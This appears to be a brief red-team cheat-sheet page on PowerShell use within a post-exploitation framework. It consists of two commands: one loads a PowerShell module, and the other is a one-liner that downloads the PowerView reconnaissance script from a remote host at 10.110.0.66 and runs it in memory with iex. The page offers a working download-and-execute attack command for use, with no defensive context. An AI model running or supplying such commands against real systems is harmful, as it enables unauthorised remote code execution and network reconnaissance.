# Powershell

## Powershell

### Load Powershell module

```text
load powershell
```

### import remote script

```csharp
powershell_execute "iex ((new-object net.webclient).DownloadString('http://10.110.0.66/redteam/powerview.ps1'))"
```

